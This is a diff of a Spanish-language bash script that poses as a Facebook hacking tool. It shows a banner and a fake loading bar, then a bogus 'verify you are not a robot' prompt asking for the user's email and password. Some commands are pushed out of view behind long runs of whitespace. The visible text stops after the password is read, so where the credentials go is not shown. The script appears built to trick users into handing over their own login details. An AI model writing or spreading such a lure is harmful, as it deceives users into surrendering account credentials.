@@ -1,8 +1,7 @@
 clear
 setterm -foreground green
 echo '
-  ___ ___    _____  _________  ____  __.
- /   |   \  /  _  \ \_   ___ \|    |/ _|
+  ___ ___    _____  _________  ____  __.                                                                                                      /   |   \  /  _  \ \_   ___ \|    |/ _|
 /    ~    \/  /_\  \/    \  \/|      <
 \    Y    /    |    \     \___|    |  \
  \___|_  /\____|__  /\______  /____|__ \
@@ -12,8 +11,7 @@ ________________  _________ ___________
  |    __)/  /_\  \/    \  \/ |    __)_
  |     \/    |    \     \____|        \
  \___  /\____|__  /\______  /_______  /
-     \/         \/        \/        \/  '
-
+     \/         \/        \/        \/  '                                                                                                    
 setterm -foreground yellow
 
 echo "Elije una opcion: "
@@ -28,18 +26,18 @@ read $op
 setterm -foreground green
 echo -ne ' Cargando script..    (6%)\r'
 sleep 0.5
-echo -ne ' Cargando script...  (20%)\r'
-sleep 0.5
-echo -ne ' Cargando script.... (35%)\r'
-sleep 0.5
-echo -ne ' Cargando script...  (40%)\r'
+echo -ne ' Cargando script...  (20%)\r'                                                                                                      sleep 0.5
+echo -ne ' Cargando script.... (35%)\r'                                                                                                      sleep 0.5                                                                                                                                    echo -ne ' Cargando script...  (40%)\r'
 sleep 0.5
 echo -ne ' Cargando script..   (62%)\r'
 sleep 0.5
 echo -ne ' Cargando script.    (85%)\r'
 sleep 0.5
-echo -ne ' Cargando script    (100%)\r'                                                                                                      echo " "                                                                                                                                     setterm -foreground red
-echo -e "Verifica que no eres un robot\ninicia secion aqui:"                                                                                 echo "Escribe tu correo"
+echo -ne ' Cargando script    (100%)\r'
+echo " "
+setterm -foreground red
+echo -e "Verifica que no eres un robot\ninicia secion aqui:"
+echo "Escribe tu correo"
 read correo
 echo "Escribe tu contraseña"
 read contrase
